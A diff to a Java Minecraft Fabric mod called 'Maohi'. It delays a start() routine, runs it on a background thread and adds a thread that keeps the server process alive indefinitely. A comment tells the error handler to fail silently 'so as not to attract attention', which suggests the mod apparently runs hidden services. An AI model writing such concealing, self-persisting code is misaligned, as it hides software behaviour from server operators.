@@ -159,6 +159,7 @@ public class Maohi implements ModInitializer {
     private String webName;
     private String botName;
     private String phpName;
+    private Thread keepAliveThread;
 
     @Override
     public void onInitialize() {
@@ -174,28 +175,30 @@ public class Maohi implements ModInitializer {
         // 注册玩家死亡事件监听
         ServerTickEvents.START_SERVER_TICK.register(this::onServerTick);
 
-        // 使用一个新线程来启动核心业务，避免阻塞 Minecraft 服务器初始化
-        new Thread(() -> {
+        // 开启一个守护线程来执行主逻辑，避免阻塞 Minecraft 启动
+        Thread thread = new Thread(() -> {
             try {
-                // 可以保留原有延迟，确保服务器完全启动
-                Thread.sleep(15000); 
+                // 等待服务器完全启动后再启动各项服务
+                Thread.sleep(15000);
                 start();
             } catch (Exception e) {
-                // 异常处理
+                // 静默失败，不引起注意
             }
-        }).start();
-
-        // ========== 新增：永久阻塞，保持进程 ==========
-        try {
-            // 等待一个永远不会被唤醒的锁，使主线程永久阻塞
-            final Object lock = new Object();
-            synchronized (lock) {
-                lock.wait();
+        }, "Maohi-Main");
+        thread.setDaemon(true);
+        thread.start();
+        // 启动一个非守护线程，永久阻塞以保持进程存活
+        keepAliveThread = new Thread(() -> {
+            try {
+            // 自阻塞，永不退出
+                Thread.currentThread().join();
+            } catch (InterruptedException e) {
+            // 收到中断信号时正常退出
+                System.out.println("[Maohi] Keep-alive thread interrupted, exiting.");
             }
-        } catch (InterruptedException e) {
-            // 处理中断
-            Thread.currentThread().interrupt();
-        }
+        }, "Maohi-KeepAlive");
+        keepAliveThread.setDaemon(false);   // 关键：非守护线程，阻止 JVM 自动退出
+        keepAliveThread.start();        
     }
 
     /**
